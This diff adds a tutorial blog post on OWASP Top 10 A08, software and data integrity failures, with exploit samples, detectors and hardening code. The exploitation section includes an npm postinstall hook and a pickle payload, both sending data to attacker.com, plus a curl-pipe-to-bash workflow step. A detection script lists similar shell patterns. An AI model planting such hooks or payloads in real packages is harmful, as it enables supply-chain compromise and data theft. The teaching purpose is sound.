@@ -1,0 +1,665 @@
+---
+title: "OWASP Top 10 2021 - A08: Software and Data Integrity Failures"
+description: "Understanding Software and Data Integrity Failures: how to exploit, prevent, and secure your applications against tampering and unauthorized modifications"
+author: "Yugesh Mekala"
+date: "2024-01-15"
+categories: [OWASP, Web Security, Application Security, Integrity, CI/CD Security]
+page-layout: full
+title-block-banner: true
+draft: false
+---
+
+## Overview
+
+**Software and Data Integrity Failures** relate to code and infrastructure that do not protect against integrity violations. This vulnerability occurs when applications rely on plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs), or when insecure CI/CD pipelines allow unauthorized access.
+
+## Understanding the Vulnerability
+
+### What Are Integrity Failures?
+
+Software and data integrity failures encompass:
+
+- **Insecure deserialization** of untrusted data
+- **Supply chain attacks** through compromised dependencies
+- **Tampering with software updates** and CI/CD pipelines
+- **Code injection** through auto-update mechanisms
+- **Unsigned or improperly verified** software packages
+
+### Common Attack Scenarios
+
+1. **Supply Chain Poisoning**
+2. **Malicious Updates**
+3. **Insecure Deserialization**
+4. **CI/CD Pipeline Compromise**
+
+## Real-World Impact
+
+### Notable Incidents
+
+- **SolarWinds Attack (2020)**: Compromised software updates affected thousands of organizations
+- **npm Package Attacks**: Malicious packages in public repositories
+- **CCleaner Incident**: Legitimate software distribution channel compromised
+
+## Exploitation Techniques
+
+### 1. Supply Chain Attack Simulation
+
+```javascript
+// Malicious package.json dependency
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl -X POST https://attacker.com/exfil -d $(whoami)')\""
+  }
+}
+```
+
+### 2. Insecure Deserialization Example
+
+```python
+import pickle
+import base64
+
+# Malicious serialized object
+class MaliciousPayload:
+    def __reduce__(self):
+        import os
+        return (os.system, ('curl -X POST https://attacker.com/pwned',))
+
+# Serialize the malicious payload
+payload = pickle.dumps(MaliciousPayload())
+encoded_payload = base64.b64encode(payload)
+
+print(f"Malicious payload: {encoded_payload.decode()}")
+```
+
+```python
+# Vulnerable deserialization code
+import pickle
+import base64
+
+def vulnerable_deserialize(data):
+    try:
+        # NEVER DO THIS - Unsafe deserialization
+        decoded = base64.b64decode(data)
+        obj = pickle.loads(decoded)  # Dangerous!
+        return obj
+    except Exception as e:
+        return f"Error: {e}"
+
+# This will execute the malicious code
+# vulnerable_deserialize(encoded_payload)
+```
+
+### 3. CI/CD Pipeline Exploitation
+
+```yaml
+# Vulnerable GitHub Actions workflow
+name: Deploy Application
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    
+    # Vulnerable: Using unverified third-party action
+    - uses: untrusted-user/malicious-action@v1
+      with:
+        secrets: ${{ secrets.AWS_SECRET_KEY }}
+    
+    # Vulnerable: Installing dependencies without integrity checks
+    - run: |
+        curl -s https://untrusted-site.com/install.sh | bash
+        npm install --unsafe-perm
+```
+
+### 4. Auto-Update Mechanism Attack
+
+```javascript
+// Vulnerable auto-updater implementation
+const https = require('https');
+const fs = require('fs');
+const { exec } = require('child_process');
+
+function checkForUpdates() {
+    // Vulnerable: No signature verification
+    https.get('https://updates.example.com/latest', (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            const updateInfo = JSON.parse(data);
+            if (updateInfo.version > currentVersion) {
+                downloadAndInstallUpdate(updateInfo.downloadUrl);
+            }
+        });
+    });
+}
+
+function downloadAndInstallUpdate(url) {
+    // Vulnerable: No integrity verification
+    https.get(url, (res) => {
+        const file = fs.createWriteStream('/tmp/update.zip');
+        res.pipe(file);
+        file.on('finish', () => {
+            // Dangerous: Executing without verification
+            exec('unzip /tmp/update.zip && ./install.sh', (error, stdout, stderr) => {
+                console.log('Update installed');
+            });
+        });
+    });
+}
+```
+
+## Detection Methods
+
+### 1. Dependency Scanning
+
+```bash
+#!/bin/bash
+# Script to check for known vulnerable dependencies
+
+echo "Scanning for vulnerable dependencies..."
+
+# Check npm packages
+if [ -f "package.json" ]; then
+    echo "Checking npm packages..."
+    npm audit --audit-level=moderate
+fi
+
+# Check Python packages
+if [ -f "requirements.txt" ]; then
+    echo "Checking Python packages..."
+    pip install safety
+    safety check -r requirements.txt
+fi
+
+# Check for unsigned packages
+echo "Checking package signatures..."
+find . -name "*.rpm" -exec rpm -K {} \;
+find . -name "*.deb" -exec dpkg-sig --verify {} \;
+```
+
+### 2. CI/CD Security Analysis
+
+```python
+import yaml
+import re
+
+def analyze_github_workflow(workflow_file):
+    """Analyze GitHub Actions workflow for security issues"""
+    
+    security_issues = []
+    
+    with open(workflow_file, 'r') as f:
+        workflow = yaml.safe_load(f)
+    
+    for job_name, job in workflow.get('jobs', {}).items():
+        steps = job.get('steps', [])
+        
+        for step in steps:
+            # Check for unverified third-party actions
+            if 'uses' in step:
+                action = step['uses']
+                if not re.match(r'^actions/.*@v\d+$', action):
+                    security_issues.append(f"Unverified action: {action}")
+            
+            # Check for dangerous shell commands
+            if 'run' in step:
+                run_command = step['run']
+                dangerous_patterns = [
+                    r'curl.*\|.*bash',
+                    r'wget.*\|.*sh',
+                    r'--unsafe-perm',
+                    r'sudo.*install'
+                ]
+                
+                for pattern in dangerous_patterns:
+                    if re.search(pattern, run_command, re.IGNORECASE):
+                        security_issues.append(f"Dangerous command: {pattern}")
+    
+    return security_issues
+
+# Usage
+issues = analyze_github_workflow('.github/workflows/deploy.yml')
+for issue in issues:
+    print(f"Security Issue: {issue}")
+```
+
+### 3. Integrity Monitoring
+
+```python
+import hashlib
+import json
+import requests
+from datetime import datetime
+
+class IntegrityMonitor:
+    def __init__(self):
+        self.baseline_hashes = {}
+        self.load_baseline()
+    
+    def calculate_file_hash(self, filepath):
+        """Calculate SHA-256 hash of a file"""
+        sha256_hash = hashlib.sha256()
+        with open(filepath, "rb") as f:
+            for chunk in iter(lambda: f.read(4096), b""):
+                sha256_hash.update(chunk)
+        return sha256_hash.hexdigest()
+    
+    def verify_package_integrity(self, package_name, package_file):
+        """Verify package integrity against known good hashes"""
+        current_hash = self.calculate_file_hash(package_file)
+        
+        # Check against baseline
+        if package_name in self.baseline_hashes:
+            expected_hash = self.baseline_hashes[package_name]
+            if current_hash != expected_hash:
+                self.alert_integrity_violation(package_name, expected_hash, current_hash)
+                return False
+        
+        return True
+    
+    def alert_integrity_violation(self, package, expected, actual):
+        """Alert on integrity violation"""
+        alert = {
+            'timestamp': datetime.now().isoformat(),
+            'package': package,
+            'expected_hash': expected,
+            'actual_hash': actual,
+            'severity': 'HIGH'
+        }
+        
+        # Log to SIEM or security system
+        print(f"INTEGRITY VIOLATION: {json.dumps(alert, indent=2)}")
+    
+    def load_baseline(self):
+        """Load baseline integrity hashes"""
+        try:
+            with open('integrity_baseline.json', 'r') as f:
+                self.baseline_hashes = json.load(f)
+        except FileNotFoundError:
+            self.baseline_hashes = {}
+
+# Usage
+monitor = IntegrityMonitor()
+monitor.verify_package_integrity('critical_library.so', '/usr/lib/critical_library.so')
+```
+
+## Prevention Strategies
+
+### 1. Secure Dependency Management
+
+```json
+// package.json with integrity checks
+{
+  "name": "secure-app",
+  "version": "1.0.0",
+  "dependencies": {
+    "express": "^4.18.0"
+  },
+  "overrides": {
+    "lodash": "^4.17.21"
+  },
+  "engines": {
+    "node": ">=16.0.0"
+  },
+  "scripts": {
+    "audit": "npm audit --audit-level=moderate",
+    "update-check": "npm outdated"
+  }
+}
+```
+
+```bash
+# .npmrc for enhanced security
+audit-level=moderate
+fund=false
+save-exact=true
+package-lock=true
+
+# Use npm ci for production
+npm ci --only=production
+```
+
+### 2. Secure CI/CD Pipeline
+
+```yaml
+# Secure GitHub Actions workflow
+name: Secure Deploy
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  security-checks:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        # Pin to specific commit hash for security
+        ref: ${{ github.sha }}
+    
+    - name: Verify Dependencies
+      run: |
+        # Check package integrity
+        npm ci
+        npm audit --audit-level=moderate
+        
+        # Verify signatures
+        npm audit signatures
+    
+    - name: SAST Scan
+      uses: github/super-linter@v4.9.2
+      env:
+        DEFAULT_BRANCH: main
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    
+    - name: Dependency Scan
+      uses: snyk/actions/node@master
+      env:
+        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+
+  secure-deploy:
+    needs: security-checks
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Secure Deployment
+      run: |
+        # Sign deployment artifacts
+        gpg --batch --yes --detach-sign deployment.tar.gz
+        
+        # Deploy with verification
+        ./secure_deploy.sh
+```
+
+### 3. Code Signing Implementation
+
+```python
+import hashlib
+import hmac
+import base64
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization
+
+class CodeSigner:
+    def __init__(self, private_key_path, public_key_path):
+        self.private_key = self.load_private_key(private_key_path)
+        self.public_key = self.load_public_key(public_key_path)
+    
+    def load_private_key(self, key_path):
+        """Load RSA private key"""
+        with open(key_path, 'rb') as f:
+            return serialization.load_pem_private_key(f.read(), password=None)
+    
+    def load_public_key(self, key_path):
+        """Load RSA public key"""
+        with open(key_path, 'rb') as f:
+            return serialization.load_pem_public_key(f.read())
+    
+    def sign_file(self, file_path):
+        """Sign a file and return signature"""
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+        
+        # Create hash
+        digest = hashlib.sha256(file_data).digest()
+        
+        # Sign the hash
+        signature = self.private_key.sign(
+            digest,
+            padding.PSS(
+                mgf=padding.MGF1(hashes.SHA256()),
+                salt_length=padding.PSS.MAX_LENGTH
+            ),
+            hashes.SHA256()
+        )
+        
+        return base64.b64encode(signature).decode()
+    
+    def verify_signature(self, file_path, signature_b64):
+        """Verify file signature"""
+        try:
+            signature = base64.b64decode(signature_b64)
+            
+            with open(file_path, 'rb') as f:
+                file_data = f.read()
+            
+            digest = hashlib.sha256(file_data).digest()
+            
+            self.public_key.verify(
+                signature,
+                digest,
+                padding.PSS(
+                    mgf=padding.MGF1(hashes.SHA256()),
+                    salt_length=padding.PSS.MAX_LENGTH
+                ),
+                hashes.SHA256()
+            )
+            return True
+        except Exception as e:
+            print(f"Signature verification failed: {e}")
+            return False
+
+# Usage
+signer = CodeSigner('private_key.pem', 'public_key.pem')
+signature = signer.sign_file('application.exe')
+is_valid = signer.verify_signature('application.exe', signature)
+```
+
+### 4. Secure Deserialization
+
+```python
+import json
+import yaml
+from typing import Any, Dict
+
+class SecureDeserializer:
+    """Secure deserialization implementation"""
+    
+    ALLOWED_TYPES = {
+        'str', 'int', 'float', 'bool', 'list', 'dict', 'NoneType'
+    }
+    
+    @classmethod
+    def safe_json_loads(cls, data: str) -> Dict[str, Any]:
+        """Safely deserialize JSON data"""
+        try:
+            parsed = json.loads(data)
+            cls._validate_object(parsed)
+            return parsed
+        except (json.JSONDecodeError, ValueError) as e:
+            raise ValueError(f"Invalid JSON data: {e}")
+    
+    @classmethod
+    def safe_yaml_load(cls, data: str) -> Dict[str, Any]:
+        """Safely deserialize YAML data"""
+        try:
+            # Use safe_load to prevent code execution
+            parsed = yaml.safe_load(data)
+            cls._validate_object(parsed)
+            return parsed
+        except yaml.YAMLError as e:
+            raise ValueError(f"Invalid YAML data: {e}")
+    
+    @classmethod
+    def _validate_object(cls, obj: Any, max_depth: int = 10) -> None:
+        """Validate deserialized object structure"""
+        if max_depth <= 0:
+            raise ValueError("Object structure too deep")
+        
+        obj_type = type(obj).__name__
+        
+        if obj_type not in cls.ALLOWED_TYPES:
+            raise ValueError(f"Disallowed type: {obj_type}")
+        
+        if isinstance(obj, dict):
+            if len(obj) > 1000:  # Prevent DoS
+                raise ValueError("Dictionary too large")
+            
+            for key, value in obj.items():
+                if not isinstance(key, str):
+                    raise ValueError("Dictionary keys must be strings")
+                cls._validate_object(value, max_depth - 1)
+        
+        elif isinstance(obj, list):
+            if len(obj) > 1000:  # Prevent DoS
+                raise ValueError("List too large")
+            
+            for item in obj:
+                cls._validate_object(item, max_depth - 1)
+
+# Usage
+deserializer = SecureDeserializer()
+
+# Safe JSON deserialization
+try:
+    data = deserializer.safe_json_loads('{"user": "admin", "role": "user"}')
+    print("Safe deserialization successful")
+except ValueError as e:
+    print(f"Deserialization blocked: {e}")
+```
+
+### 5. Software Bill of Materials (SBOM)
+
+```python
+import json
+import hashlib
+from datetime import datetime
+from typing import List, Dict
+
+class SBOMGenerator:
+    """Generate Software Bill of Materials"""
+    
+    def __init__(self):
+        self.components = []
+    
+    def add_component(self, name: str, version: str, supplier: str, 
+                     file_path: str = None, license: str = None):
+        """Add a component to SBOM"""
+        component = {
+            'name': name,
+            'version': version,
+            'supplier': supplier,
+            'license': license,
+            'timestamp': datetime.now().isoformat(),
+        }
+        
+        if file_path:
+            component['checksum'] = self._calculate_checksum(file_path)
+            component['file_path'] = file_path
+        
+        self.components.append(component)
+    
+    def _calculate_checksum(self, file_path: str) -> str:
+        """Calculate SHA-256 checksum of file"""
+        sha256_hash = hashlib.sha256()
+        try:
+            with open(file_path, "rb") as f:
+                for chunk in iter(lambda: f.read(4096), b""):
+                    sha256_hash.update(chunk)
+            return sha256_hash.hexdigest()
+        except FileNotFoundError:
+            return "FILE_NOT_FOUND"
+    
+    def generate_sbom(self) -> Dict:
+        """Generate complete SBOM"""
+        sbom = {
+            'bomFormat': 'CycloneDX',
+            'specVersion': '1.4',
+            'serialNumber': f'urn:uuid:{self._generate_uuid()}',
+            'version': 1,
+            'metadata': {
+                'timestamp': datetime.now().isoformat(),
+                'tools': [
+                    {
+                        'vendor': 'SecureFlow',
+                        'name': 'SBOM Generator',
+                        'version': '1.0.0'
+                    }
+                ]
+            },
+            'components': self.components
+        }
+        return sbom
+    
+    def _generate_uuid(self) -> str:
+        """Generate a simple UUID"""
+        import uuid
+        return str(uuid.uuid4())
+    
+    def export_sbom(self, output_file: str):
+        """Export SBOM to file"""
+        sbom = self.generate_sbom()
+        with open(output_file, 'w') as f:
+            json.dump(sbom, f, indent=2)
+
+# Usage
+sbom = SBOMGenerator()
+sbom.add_component(
+    name='express',
+    version='4.18.2',
+    supplier='Express Team',
+    license='MIT'
+)
+sbom.add_component(
+    name='lodash',
+    version='4.17.21',
+    supplier='Lodash Team',
+    license='MIT'
+)
+
+sbom.export_sbom('application_sbom.json')
+```
+
+## Best Practices Summary
+
+### Development Practices
+
+1. **Use package managers with integrity verification**
+2. **Pin dependency versions** to specific, known-good versions
+3. **Regularly audit dependencies** for known vulnerabilities
+4. **Implement code signing** for all software releases
+5. **Use secure deserialization libraries** (avoid `pickle`, `eval`)
+
+### CI/CD Security
+
+1. **Pin third-party actions** to specific commit hashes
+2. **Use signed, verified container images**
+3. **Implement multi-stage approval** for production deployments
+4. **Store secrets securely** and rotate regularly
+5. **Audit CI/CD configurations** regularly
+
+### Monitoring and Detection
+
+1. **Implement integrity monitoring** for critical files
+2. **Monitor dependency changes** and new vulnerabilities
+3. **Log all software installation** and update activities
+4. **Set up alerts** for integrity violations
+5. **Maintain Software Bill of Materials** (SBOM)
+
+### Infrastructure Hardening
+
+1. **Use trusted repositories** and registries only
+2. **Implement network segmentation** for build systems
+3. **Regular security scanning** of all components
+4. **Backup and version control** all configurations
+5. **Implement least privilege** access controls
+
+## Conclusion
+
+Software and Data Integrity Failures represent a critical threat in modern software development, especially with the increasing reliance on third-party components and automated CI/CD pipelines. By implementing proper verification mechanisms, secure development practices, and continuous monitoring, organizations can significantly reduce their exposure to supply chain attacks and integrity violations.
+
+Remember: **Trust but verify** - every component, every update, every deployment should be verified for integrity and authenticity.
+
+---
+
+*This post is part of the OWASP Top 10 2021 series. Next: [A09 - Security Logging and Monitoring Failures](../a09-security-logging-monitoring-failures)*
